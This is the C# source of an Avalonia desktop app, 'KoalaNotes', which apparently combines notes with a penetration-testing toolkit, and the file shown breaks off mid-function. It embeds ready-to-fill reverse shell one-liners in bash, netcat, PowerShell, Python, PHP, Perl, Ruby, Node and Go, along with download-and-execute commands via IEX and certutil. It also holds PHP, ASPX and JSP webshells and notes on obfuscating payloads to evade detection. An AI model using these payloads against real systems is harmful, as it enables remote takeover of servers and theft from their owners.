using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Text.Json.Nodes;
using System.Threading.Tasks;
using Avalonia;
using Avalonia.Controls;
using Avalonia.Input;
using Avalonia.Interactivity;
using Avalonia.Media;

namespace KoalaNotes;

public partial class MainWindow : Window
{
    // ── Storage ────────────────────────────────────────────────────────────
    private readonly string _storagePath;
    private List<CategoryItem> _categories = new();

    // ── State ──────────────────────────────────────────────────────────────
    private NoteItem?     _selectedNote     = null;
    private CategoryItem? _selectedCategory = null;
    private bool          _isUpdatingUi     = false;
    private string        _currentShellFilter = "all";
    private bool          _isRenamingCategory = false;
    private string _currentWebShellFilter = "all";
    private string _currentSqliFilter     = "all";
    private string _repeaterRespTab       = "headers";
    private string _repeaterRespHeaders   = "";
    private string _repeaterRespBody      = "";
    private string _repeaterLastUrl       = "";
    private string _selectedPayloadTemplate = "{URL}";  

    // ── Drag & drop ────────────────────────────────────────────────────────
    private Point     _dragStartPoint;
    private bool      _isDragActive     = false;
    private NoteItem? _draggedNoteData  = null;

    // ── Save debounce ──────────────────────────────────────────────────────
    private System.Threading.CancellationTokenSource? _saveCts;

    // ── HTTP (IP lookup) ───────────────────────────────────────────────────
    private static readonly HttpClient _http = new() { Timeout = TimeSpan.FromSeconds(10) };

    // ── Shell blueprints ───────────────────────────────────────────────────
    private readonly List<ShellBlueprint> _blueprints = new()
    {
        new() { Name = "Bash /dev/tcp Connection",       Category = "linux",   Template = "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1" },
        new() { Name = "Bash Netcat FIFO Pipe Relay",    Category = "linux",   Template = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f" },
        new() { Name = "Bash UDP Connection",            Category = "linux",   Template = "sh -i >& /dev/udp/{LHOST}/{LPORT} 0>&1" },
        new() { Name = "Socat Interactive PTY",          Category = "linux",   Template = "socat tcp-connect:{LHOST}:{LPORT} exec:\"bash -li\",pty,stderr,setsid,sigint,sane" },
        new() { Name = "Bash Dual-Directional Pipe",     Category = "linux",   Template = "bash -i 5<>/dev/tcp/{LHOST}/{LPORT} 0<&5 1>&5 2>&5" },
        new() { Name = "Netcat OpenBSD (no -e)",         Category = "linux",   Template = "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | nc {LHOST} {LPORT} > /tmp/s; rm /tmp/s" },
        new() { Name = "Awk Network Stream Injection",   Category = "linux",   Template = "awk 'BEGIN {s = \"/inet/tcp/0/{LHOST}/{LPORT}\"; while(1) { printf \"shell> \" |& s; s |& getline c; if (c == \"exit\") close(s); while ((c |& getline) > 0) print $0 |& s; close(c) }}'" },
        new() { Name = "PowerShell IEX Web Download",   Category = "windows", Template = "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://{LHOST}/run.ps1')\"" },
        new() { Name = "Windows ConPty Shell",           Category = "windows", Template = "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$t=New-Object System.Threading.Thread({while($true){try{$d=(New-Object System.IO.StreamReader($c.GetStream())).ReadLine();if($d -eq 'exit'){$c.Close();break};iex $d | Out-String | %{(New-Object System.IO.StreamWriter($c.GetStream())).WriteLine($_);(New-Object System.IO.StreamWriter($c.GetStream())).Flush()}}catch{break}});$t.Start()\"" },
        new() { Name = "PowerShell Interactive Reverse",  Category = "windows", Template = "$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$t=($r+'PS '+(pwd).Path+'> ');$x=([text.encoding]::ASCII).GetBytes($t);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()" },
        new() { Name = "Windows cmd.exe Netcat",         Category = "windows", Template = "nc.exe {LHOST} {LPORT} -e cmd.exe" },
        new() { Name = "Windows Certutil Execution",     Category = "windows", Template = "certutil.exe -urlcache -split -f http://{LHOST}/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe" },
        new() { Name = "Python3 Interactive PTY Shell",  Category = "script",  Template = "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" },
        new() { Name = "PHP Socket Execution Loop",      Category = "script",  Template = "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
        new() { Name = "Ruby Socket Connection",         Category = "script",  Template = "ruby -rsocket -e 'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
        new() { Name = "Perl Socket Relay",              Category = "script",  Template = "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" },
        new() { Name = "NodeJS Interactive Stream",      Category = "script",  Template = "node -e 'const net=require(\"net\"),cp=require(\"child_process\");const cl=new net.Socket();cl.connect({LPORT},\"{LHOST}\",()=>{const sh=cp.spawn(\"/bin/sh\",[\"-i\"]);cl.pipe(sh.stdin);sh.stdout.pipe(cl);sh.stderr.pipe(cl);});'" },
        new() { Name = "Golang Standalone Reverse",      Category = "script",  Template = "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{LHOST}:{LPORT}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" }
    };

    // ── Webshell blueprints ────────────────────────────────────────────────
    private readonly List<ShellBlueprint> _webShellBlueprints = new()
    {
        // PHP
        new() { Name = "PHP Simple Exec",           Category = "php",  Template = "<?php system($_GET['cmd']); ?>" },
        new() { Name = "PHP Simple Exec",           Category = "php",  Template = "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; } ?>" },
        new() { Name = "PHP Passthru One-liner",    Category = "php",  Template = "<?php passthru($_GET['cmd']); ?>" },
        new() { Name = "PHP Shell Exec",            Category = "php",  Template = "<?php echo shell_exec($_GET['cmd']); ?>" },
        new() { Name = "PHP Reverse Shell",         Category = "php",  Template = "<?php $sock=fsockopen(\"{LHOST}\",{LPORT});$proc=proc_open('/bin/sh -i',array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>" },
        new() { Name = "PHP Base64 Encoded Shell",  Category = "php",  Template = "<?php eval(base64_decode($_GET['cmd'])); ?>" },
        new() { Name = "PHP File Upload Shell",     Category = "php",  Template = "<?php move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']); ?>" },

        // ASPX
        new() { Name = "ASPX Cmd Shell",            Category = "aspx", Template = "<%@ Page Language=\"C#\" %><% System.Diagnostics.Process p=new System.Diagnostics.Process(); p.StartInfo.FileName=\"cmd.exe\"; p.StartInfo.Arguments=\"/c \"+Request[\"cmd\"]; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>" },
        new() { Name = "ASPX PowerShell Drop",      Category = "aspx", Template = "<%@ Page Language=\"C#\" %><% var p=new System.Diagnostics.Process(); p.StartInfo.FileName=\"powershell\"; p.StartInfo.Arguments=\"-nop -c \"+Request[\"cmd\"]; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>" },
        new() { Name = "ASPX Command Executor",     Category = "aspx", Template = "<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><% Process p = new Process(); p.StartInfo.FileName = \"cmd.exe\"; p.StartInfo.Arguments = \"/c \" + Request.QueryString[\"cmd\"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>" },

        // JSP
        new() { Name = "JSP Runtime Exec",          Category = "jsp",  Template = "<%Runtime rt=Runtime.getRuntime(); String[] commands={\"/bin/bash\",\"-c\",request.getParameter(\"cmd\")}; Process proc=rt.exec(commands); out.println(new java.util.Scanner(proc.getInputStream()).useDelimiter(\"\\\\A\").next()); %>" },
        new() { Name = "JSP ProcessBuilder",        Category = "jsp",  Template = "<%@ page import=\"java.util.*,java.io.*\"%><% String cmd=request.getParameter(\"cmd\"); ProcessBuilder pb=new ProcessBuilder(\"/bin/bash\",\"-c\",cmd); pb.redirectErrorStream(true); Process p=pb.start(); out.println(new Scanner(p.getInputStream()).useDelimiter(\"\\\\A\").next()); %>" },
        new() { Name = "JSP Webshell (Base64)",     Category = "jsp",  Template = "<% String c = request.getParameter(\"cmd\"); if(c!=null){ Process p = Runtime.getRuntime().exec(c); java.io.InputStream i = p.getInputStream(); int b; while((b=i.read())!=-1){ out.print((char)b); } } %>" },

        // Other
        new() { Name = "ColdFusion Shell",          Category = "other", Template = "<cfexecute name = \"cmd.exe\" arguments = \"/c #url.cmd#\" timeout = \"10\"></cfexecute>" }
    };

    // ── Obfuscator support table ───────────────────────────────────────────
    private static readonly Dictionary<string, string[]> ObfSupport = new()
    {
        ["bash"]       = new[] { "b64", "hex", "char", "rev", "var", "tick" },
        ["powershell"] = new[] { "b64", "hex", "char", "rev", "var", "tick" },
        ["cmd"]        = new[] { "var", "tick" },
        ["python"]     = new[] { "b64", "hex", "char", "rev", "var", "tick" },
        ["php"]        = new[] { "b64", "hex", "char", "rev", "var", "tick" },
        ["javascript"] = new[] { "b64", "hex", "char", "rev", "var", "tick" },
        ["perl"]       = new[] { "b64", "hex", "char", "rev", "var", "tick" },
        ["ruby"]       = new[] { "b64", "hex", "char", "rev", "var", "tick" },
    };

    private static readonly Dictionary<string, Dictionary<string, string>> ObfTips = new()
    {
        ["b64"] = new()
        {
            ["bash"]       = "Pipes payload through base64 -d and runs it with eval.",
            ["powershell"] = "Uses UTF-16LE encoding required by -EncodedCommand — not plain UTF-8 base64.",
            ["python"]     = "Outputs a python3 -c one-liner. Decodes with __import__('base64') inline.",
            ["php"]        = "Decodes with base64_decode() and runs with eval().",
            ["javascript"] = "Decodes with atob() and runs with eval().",
            ["perl"]       = "Uses MIME::Base64 (core since Perl 5.8) to decode, then eval runs it.",
            ["ruby"]       = "Uses stdlib Base64.decode64(), then eval runs it.",
            ["cmd"]        = "CMD does not support base64 natively. Use var split or tick insert instead.",
        },
        ["hex"] = new()
        {
            ["bash"]       = "Uses ANSI-C quoting $'\\xNN' — bash/ksh/zsh interpret hex escapes natively. Not POSIX sh.",
            ["powershell"] = "Builds a [byte[]] array, decodes as UTF-8 string, then iex executes.",
            ["python"]     = "Converts with bytes.fromhex(), decodes to string, then exec().",
            ["php"]        = "pack(\"H*\",...) converts hex string to raw bytes, then eval().",
            ["javascript"] = "\\xNN hex escapes are valid inside JS double-quoted string literals.",
            ["perl"]       = "pack(\"H*\",...) converts hex to raw bytes, then eval runs the result.",
            ["ruby"]       = "Array#pack(\"H*\") converts hex to binary string, then eval runs it.",
        },
        ["char"] = new()
        {
            ["bash"]       = "Uses octal escapes $'\\NNN' inside ANSI-C quoting — bash runs the assembled string directly.",
            ["powershell"] = "[char]N casts int to char; -join assembles the array; iex executes.",
            ["python"]     = "chr() converts each int to a char; join assembles; exec() runs it.",
            ["php"]        = "chr() converts each int; implode joins; eval() executes.",
            ["javascript"] = "String.fromCharCode() per code point; join assembles; eval() runs it.",
            ["perl"]       = "chr() converts each int; join assembles; eval runs the result.",
            ["ruby"]       = "Integer#chr gives the char; map+join assembles; eval runs it.",
        },
        ["rev"] = new()
        {
            ["bash"]       = "rev (util-linux) reverses stdin line-by-line; output pipes to bash.",
            ["powershell"] = "Array index [-1..-N] walks the string backwards; -join reassembles; iex executes.",
            ["python"]     = "Hex-encodes the reversed payload. bytes.fromhex().decode()[::-1] reverses back; exec() runs it.",
            ["php"]        = "strrev() reverses; eval() executes the reversed string as PHP.",
            ["javascript"] = ".split('').reverse().join('') reverses; eval() executes.",
            ["perl"]       = "scalar reverse reverses a string; eval runs the result.",
            ["ruby"]       = "String#reverse reverses; eval runs the result.",
        },
        ["var"] = new()
        {
            ["bash"]       = "Assigns chunks to named vars; ${a}${b} expands them; eval executes the joined string.",
            ["powershell"] = "Assigns chunks to $vars; $a+$b string concat; iex executes.",
            ["python"]     = "Assigns chunks to variables; + concat; exec() runs the assembled string.",
            ["php"]        = "Assigns chunks to $vars; . concat; eval() executes.",
            ["javascript"] = "Assigns chunks to vars; + concat; eval() executes.",
            ["cmd"]        = "SET assigns chunks; setlocal enabledelayedexpansion + !var! expand at runtime; call cmd /c executes.",
            ["perl"]       = "Assigns chunks to my $vars; . concat; eval() runs the assembled string.",
            ["ruby"]       = "Assigns chunks to variables; + concat; eval runs the assembled string.",
        },
        ["tick"] = new()
        {
            ["bash"]       = "Inserts empty string '' within identifier tokens — bash treats it as a no-op. e.g. cat → c''at.",
            ["powershell"] = "Inserts backtick ` within unquoted tokens — PS treats it as a no-op. e.g. whoami → wh`oa`mi.",
            ["python"]     = "Splits string literals with + concat — only affects string content, never keywords.",
            ["php"]        = "Splits string literals with . concat — only affects string content, never keywords.",
            ["javascript"] = "Replaces letters in identifiers with \\uXXXX unicode escapes. String contents are left untouched.",
            ["cmd"]        = "Inserts caret ^ within identifier tokens — CMD parser discards it silently. e.g. whoami → wh^oa^mi.",
            ["perl"]       = "Splits string literals with . concat — only affects string content, never barewords.",
            ["ruby"]       = "Splits string literals with + concat — only affects string content, never method names.",
        },
    };

    // ══════════════════════════════════════════════════════════════════════
    // Constructor
    // ══════════════════════════════════════════════════════════════════════
    public MainWindow()
    {
        InitializeComponent();
        
        // Set up the path, but DON'T load yet
        string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string appDir = Path.Combine(homeDir, "KoalaNotes");
        Directory.CreateDirectory(appDir);
        _storagePath = Path.Combine(appDir, "vault.json");

        // Subscribe to the Opened event instead of calling methods directly
        this.Opened += (s, e) => {
            try 
            {
                LoadDataFromDisk();
                UpdateReverseShellContainer();
                UpdateWebShellContainer();
            }
            catch (Exception ex)
            {
                // If it crashes here, you'll see the error instead of a silent death
                File.WriteAllText(Path.Combine(appDir, "error_log.txt"), ex.ToString());
            }
        };
    }

    // ══════════════════════════════════════════════════════════════════════
    // Press Enter to submit
    // ══════════════════════════════════════════════════════════════════════
    private void OnGlobalKeyDown(object sender, KeyEventArgs e)
    {
        if (e.Key == Key.Enter && sender is TextBox textBox)
        {
            // Prevent the text box from inserting a newline character
            e.Handled = true; 

            // Trigger the logic based on the active panel
            if (ViewIpPanel.IsVisible)
                OnIpLookupClick(this, new RoutedEventArgs());
            else if (ViewOsintPanel.IsVisible)
                OnExecuteOsintHub(this, new RoutedEventArgs());
            else if (ViewExploitPanel.IsVisible)
                OnRunExploitSearch(this, new RoutedEventArgs());            
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // Navigation
    // ══════════════════════════════════════════════════════════════════════
    private void OnPageNavigationChanged(object sender, SelectionChangedEventArgs e)
    {
        if (PageNavigationDropdown?.SelectedItem is not ComboBoxItem item || item.Tag is not string activeTag) return;

        if (ViewNotesPanel    != null) ViewNotesPanel.IsVisible    = activeTag == "notes";
        if (ViewEncoderPanel  != null) ViewEncoderPanel.IsVisible  = activeTag == "encoder";
        if (ViewIpPanel       != null) ViewIpPanel.IsVisible       = activeTag == "ip";
        if (ViewOsintPanel    != null) ViewOsintPanel.IsVisible    = activeTag == "osint";
        if (ViewRShellsPanel  != null) ViewRShellsPanel.IsVisible  = activeTag == "rshells";
        if (ViewWebShellsPanel != null) ViewWebShellsPanel.IsVisible = activeTag == "webshells";
        if (ViewExploitPanel  != null) ViewExploitPanel.IsVisible  = activeTag == "exploit";
        if (ViewObfuscatePanel != null) ViewObfuscatePanel.IsVisible = activeTag == "obfuscate";
        if (ViewSqliPanel      != null) ViewSqliPanel.IsVisible      = activeTag == "sqli";
        if (ViewRepeaterPanel  != null) ViewRepeaterPanel.IsVisible  = activeTag == "repeater";

        if (activeTag == "sqli") RefreshSqliPayloads();

        // Show/hide the + note button only on Notes tab
        if (GlobalNewNoteBtn != null) GlobalNewNoteBtn.IsVisible = activeTag == "notes";

        if (AppSidebarPanel != null && MainBodyLayoutGrid != null)
        {
            AppSidebarPanel.IsVisible = activeTag == "notes";
            MainBodyLayoutGrid.ColumnDefinitions = ColumnDefinitions.Parse(activeTag == "notes" ? "230, 4, *" : "0, 0, *");
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // Notes – Tree & Editor
    // ══════════════════════════════════════════════════════════════════════
    private void OnTreeSelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        if (NotesCategoryTree?.SelectedItem is TreeViewItem node)
        {
            if (node.Tag is NoteItem note)
            {
                _selectedNote     = note;
                _selectedCategory = _categories.FirstOrDefault(c => c.Notes.Contains(note));
                DisplayActiveNoteWorkspace();
                return;
            }
            if (node.Tag is CategoryItem cat)
            {
                _selectedCategory = cat;
                _selectedNote     = null;
                DisplayEmptyState();
                return;
            }
        }
        _selectedNote = null; _selectedCategory = null;
        DisplayEmptyState();
    }

    private void DisplayActiveNoteWorkspace()
    {
        if (_selectedNote == null) return;
        _isUpdatingUi = true;

        if (EmptyWorkspaceState != null) EmptyWorkspaceState.IsVisible = false;
        if (NoteTitleTxt != null) { NoteTitleTxt.IsVisible = true; NoteTitleTxt.Text = _selectedNote.Title; }
        if (NoteBodyTxt  != null) { NoteBodyTxt.IsVisible  = true; NoteBodyTxt.Text  = _selectedNote.Body; }

        if (StatusCategoryTxt  != null) StatusCategoryTxt.Text  = _selectedCategory?.Label.ToUpper() ?? "—";
        if (StatusNoteTxt      != null) StatusNoteTxt.Text      = _selectedNote.Title;
        if (StatusCharCountTxt != null) StatusCharCountTxt.Text = $"{_selectedNote.Body.Length} chars";

        _isUpdatingUi = false;
    }

    private void DisplayEmptyState()
    {
        if (NoteTitleTxt        != null) NoteTitleTxt.IsVisible        = false;
        if (NoteBodyTxt         != null) NoteBodyTxt.IsVisible         = false;
        if (EmptyWorkspaceState != null) EmptyWorkspaceState.IsVisible = true;

        if (StatusCategoryTxt  != null) StatusCategoryTxt.Text  = _selectedCategory?.Label.ToUpper() ?? "—";
        if (StatusNoteTxt      != null) StatusNoteTxt.Text      = "no note selected";
        if (StatusCharCountTxt != null) StatusCharCountTxt.Text = "";
    }

    private void OnNoteFieldsChanged(object sender, TextChangedEventArgs e)
    {
        if (_isUpdatingUi || _selectedNote == null || NoteTitleTxt == null || NoteBodyTxt == null) return;

        _selectedNote.Title = string.IsNullOrWhiteSpace(NoteTitleTxt.Text) ? "Untitled Note" : NoteTitleTxt.Text;
        _selectedNote.Body  = NoteBodyTxt.Text ?? "";

        if (StatusNoteTxt      != null) StatusNoteTxt.Text      = _selectedNote.Title;
        if (StatusCharCountTxt != null) StatusCharCountTxt.Text = $"{_selectedNote.Body.Length} chars";

        if (NotesCategoryTree?.SelectedItem is TreeViewItem activeNode && activeNode.Tag == _selectedNote)
            activeNode.Header = _selectedNote.Title;

        DebouncedSave();
    }

    private async void DebouncedSave()
    {
        _saveCts?.Cancel();
        _saveCts = new System.Threading.CancellationTokenSource();
        var token = _saveCts.Token;
        try
        {
            await Task.Delay(500, token);
            if (!token.IsCancellationRequested)
                SaveDataToDisk();
        }
        catch (TaskCanceledException) { }
    }

    private void OnNewNoteClick(object sender, RoutedEventArgs e)
    {
        if (_selectedCategory == null)
        {
            if (_categories.Count == 0)
            {
                var gen = new CategoryItem { Label = "General" };
                _categories.Add(gen);
                _selectedCategory = gen;
            }
            else
            {
                _selectedCategory = _categories.OrderBy(c => c.Label, StringComparer.OrdinalIgnoreCase).First();
            }
        }

        var note = new NoteItem { Title = "New Note", Body = "" };
        _selectedCategory.Notes.Add(note);
        _selectedNote = note;

        SaveDataToDisk();
        PopulateSidebarTree(SidebarSearchBox?.Text ?? "");
        SelectNoteInTree(note);
    }

    // ══════════════════════════════════════════════════════════════════════
    // Categories
    // ══════════════════════════════════════════════════════════════════════
    private void OnAddCategoryClick(object sender, RoutedEventArgs e)
    {
        _isRenamingCategory = false;
        if (CategoryDialogTitle != null) CategoryDialogTitle.Text = "Create Category";
        if (CategoryDialogInput != null) CategoryDialogInput.Text = "";
        if (CategoryDialogOverlay != null) CategoryDialogOverlay.IsVisible = true;
    }

    private void OnRenameCategoryClick(object sender, RoutedEventArgs e)
    {
        if (_selectedCategory == null) return;
        _isRenamingCategory = true;
        if (CategoryDialogTitle != null) CategoryDialogTitle.Text = "Rename Category";
        if (CategoryDialogInput != null) CategoryDialogInput.Text = _selectedCategory.Label;
        if (CategoryDialogOverlay != null) CategoryDialogOverlay.IsVisible = true;
    }

    private void OnSaveCategoryDialog(object sender, RoutedEventArgs e)
    {
        if (CategoryDialogInput == null || string.IsNullOrWhiteSpace(CategoryDialogInput.Text)) return;
        string name = CategoryDialogInput.Text.Trim();

        if (_isRenamingCategory)
        {
            if (_selectedCategory != null) _selectedCategory.Label = name;
        }
        else
        {
            var cat = new CategoryItem { Label = name };
            _categories.Add(cat);
            _selectedCategory = cat;
        }

        SaveDataToDisk();
        PopulateSidebarTree(SidebarSearchBox?.Text ?? "");
        if (CategoryDialogOverlay != null) CategoryDialogOverlay.IsVisible = false;
        if (_selectedNote != null) SelectNoteInTree(_selectedNote);
    }

    private void OnCancelCategoryDialog(object sender, RoutedEventArgs e)
    {
        if (CategoryDialogOverlay != null) CategoryDialogOverlay.IsVisible = false;
    }

    private void OnUniversalDeleteClick(object sender, RoutedEventArgs e)
    {
        if (NotesCategoryTree?.SelectedItem is not TreeViewItem node) return;

        if (node.Tag is NoteItem note && _selectedCategory != null)
        {
            _selectedCategory.Notes.Remove(note);
            _selectedNote = null;
        }
        else if (node.Tag is CategoryItem cat)
        {
            _categories.Remove(cat);
            _selectedCategory = null;
            _selectedNote     = null;
        }

        SaveDataToDisk();
        PopulateSidebarTree(SidebarSearchBox?.Text ?? "");
        DisplayEmptyState();
    }

    // ══════════════════════════════════════════════════════════════════════
    // Sidebar
    // ══════════════════════════════════════════════════════════════════════
    private void OnSearchBoxChanged(object sender, TextChangedEventArgs e)
        => PopulateSidebarTree(SidebarSearchBox?.Text ?? "");

    private void OnCategoryDialogKeyDown(object sender, KeyEventArgs e)
    {
        if (e.Key == Key.Enter)
        {
            // Trigger the save action
            OnSaveCategoryDialog(sender, new RoutedEventArgs());
            e.Handled = true; // Prevent a newline character from being added
        }
        else if (e.Key == Key.Escape)
        {
            // Optional: Close dialog on Escape
            OnCancelCategoryDialog(sender, new RoutedEventArgs());
            e.Handled = true;
        }
    }

    private void PopulateSidebarTree(string filter = "")
    {
        if (NotesCategoryTree == null) return;
        NotesCategoryTree.Items.Clear();

        foreach (var cat in _categories.OrderBy(c => c.Label, StringComparer.OrdinalIgnoreCase))
        {
            // Check if the category label matches the filter
            bool catMatches = !string.IsNullOrEmpty(filter) && 
                            cat.Label.Contains(filter, StringComparison.OrdinalIgnoreCase);

            var filteredNotes = cat.Notes
                .Where(n => string.IsNullOrEmpty(filter) ||
                            catMatches || // If category matches, include all notes
                            n.Title.Contains(filter, StringComparison.OrdinalIgnoreCase) ||
                            n.Body.Contains(filter, StringComparison.OrdinalIgnoreCase))
                .OrderBy(n => n.Title, StringComparer.OrdinalIgnoreCase)
                .ToList();

            // Skip if nothing matches (neither category name nor any notes)
            if (!string.IsNullOrEmpty(filter) && !catMatches && filteredNotes.Count == 0) continue;

            var catNode = new TreeViewItem
            {
                Header     = $"{cat.Label.ToUpper()} ({filteredNotes.Count})",
                Tag        = cat,
                IsExpanded = !string.IsNullOrEmpty(filter)
            };

            DragDrop.SetAllowDrop(catNode, true);
            catNode.AddHandler(DragDrop.DragOverEvent, OnNodeDragOver);
            catNode.AddHandler(DragDrop.DropEvent, OnNodeDrop);

            foreach (var note in filteredNotes)
            {
                var noteNode = new TreeViewItem { Header = note.Title, Tag = note };
                noteNode.PointerPressed += OnNoteNodePointerPressed;
                noteNode.PointerMoved   += OnNoteNodePointerMoved;
                catNode.Items.Add(noteNode);
            }

            NotesCategoryTree.Items.Add(catNode);
        }
    }

    private void SelectNoteInTree(NoteItem target)
    {
        if (NotesCategoryTree == null) return;
        foreach (var item in NotesCategoryTree.Items)
        {
            if (item is not TreeViewItem catNode) continue;
            foreach (var sub in catNode.Items)
            {
                if (sub is TreeViewItem noteNode && noteNode.Tag == target)
                {
                    catNode.IsExpanded             = true;
                    NotesCategoryTree.SelectedItem = noteNode;
                    return;
                }
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // Drag & Drop
    // ══════════════════════════════════════════════════════════════════════
    private void OnNoteNodePointerPressed(object? sender, PointerPressedEventArgs e)
    {
        if (sender is TreeViewItem item && item.Tag is NoteItem note)
        {
            _dragStartPoint = e.GetPosition(this);
            _isDragActive   = true;
            _draggedNoteData = note;
        }
    }

    private async void OnNoteNodePointerMoved(object? sender, PointerEventArgs e)
    {
        if (!_isDragActive || _draggedNoteData == null || sender is not TreeViewItem) return;
        var delta = _dragStartPoint - e.GetPosition(this);
        if (Math.Abs(delta.X) > 5 || Math.Abs(delta.Y) > 5)
        {
            _isDragActive = false;
            var data = new DataObject();
            data.Set("KoalaNoteObjectPayload", _draggedNoteData);
            await DragDrop.DoDragDrop(e, data, DragDropEffects.Move);
            _draggedNoteData = null;
        }
    }

    private void OnNodeDragOver(object? sender, DragEventArgs e)
    {
        e.DragEffects = (e.Data.Contains("KoalaNoteObjectPayload") && sender is TreeViewItem tv && tv.Tag is CategoryItem)
            ? DragDropEffects.Move : DragDropEffects.None;
        e.Handled = true;
    }

    private void OnNodeDrop(object? sender, DragEventArgs e)
    {
        if (sender is TreeViewItem tv && tv.Tag is CategoryItem dest &&
            e.Data.Get("KoalaNoteObjectPayload") is NoteItem note)
        {
            var src = _categories.FirstOrDefault(c => c.Notes.Contains(note));
            if (src != null && src != dest)
            {
                src.Notes.Remove(note);
                dest.Notes.Add(note);
                _selectedCategory = dest;
                _selectedNote     = note;
                SaveDataToDisk();
                PopulateSidebarTree(SidebarSearchBox?.Text ?? "");
                SelectNoteInTree(note);
                DisplayActiveNoteWorkspace();
            }
        }
        e.Handled = true;
    }

    // ══════════════════════════════════════════════════════════════════════
    // Encoder
    // ══════════════════════════════════════════════════════════════════════
    private void OnEncoderInputChanged(object sender, TextChangedEventArgs e)      => RunEncodingPipeline();
    private void OnEncoderModeChanged(object sender, SelectionChangedEventArgs e)  => RunEncodingPipeline();
    private void OnCaesarParamChanged(object sender, RoutedEventArgs e)            => RunEncodingPipeline();
    private void OnCaesarParamChanged(object sender, NumericUpDownValueChangedEventArgs e) => RunEncodingPipeline();

    private void RunEncodingPipeline()
    {
        if (EncoderInputBox == null || EncoderOutputBox == null || EncoderModeList == null) return;
        if (EncoderModeList.SelectedItem is not ListBoxItem modeItem || modeItem.Tag is not string mode) return;

        if (CaesarConfigRow != null) CaesarConfigRow.IsVisible = mode == "caesar";

        string input = EncoderInputBox.Text ?? "";
        if (string.IsNullOrEmpty(input)) { EncoderOutputBox.Text = "result appears here"; return; }

        try
        {
            EncoderOutputBox.Text = mode switch
            {
                "enc"    => Uri.EscapeDataString(input),
                "dec"    => Uri.UnescapeDataString(input.Replace("+", " ")),
                "dbl"    => Uri.EscapeDataString(Uri.EscapeDataString(input)),
                "full"   => string.Concat(input.Select(c => $"%{(int)c:X2}")),
                "b64enc" => Convert.ToBase64String(Encoding.UTF8.GetBytes(input)),
                "b64dec" => Encoding.UTF8.GetString(Convert.FromBase64String(input)),
                "caesar" => RunCaesar(input),
                _        => input
            };
        }
        catch (Exception ex) { EncoderOutputBox.Text = $"[Pipeline Error]: {ex.Message}"; }
    }

    private string RunCaesar(string input)
    {
        int  shift   = (int)(CaesarShiftVal?.Value ?? 13);
        bool encrypt = CaesarEncRadio?.IsChecked ?? true;
        if (!encrypt) shift = 26 - shift;

        return new string(input.Select(c =>
        {
            if (!char.IsLetter(c)) return c;
            char offset = char.IsUpper(c) ? 'A' : 'a';
            return (char)((((c - offset) + shift) % 26) + offset);
        }).ToArray());
    }

    private async void OnCopyEncoderOutput(object sender, RoutedEventArgs e)
    {
        if (EncoderOutputBox?.Text is string txt && txt != "result appears here")
            await TrySetClipboard(txt);
    }

    // ══════════════════════════════════════════════════════════════════════
    // IP Lookup
    // ══════════════════════════════════════════════════════════════════════
    private async void OnIpLookupClick(object sender, RoutedEventArgs e)
    {
        string target = IpAddressInput?.Text?.Trim() ?? "";
        if (string.IsNullOrEmpty(target)) return;

        if (IpLocationOutput != null) IpLocationOutput.Text = "Resolving...";
        if (IpWhoisOutput    != null) IpWhoisOutput.Text    = "Fetching network data...";
        if (IpMapLinksPanel  != null) IpMapLinksPanel.Children.Clear();

        try
        {
            // ── Geo lookup ────────────────────────────────────────────────
            string geoJson = await _http.GetStringAsync($"http://ip-api.com/json/{target}");
            var    geoNode = JsonNode.Parse(geoJson);

            if (geoNode?["status"]?.GetValue<string>() != "success")
            {
                if (IpLocationOutput != null)
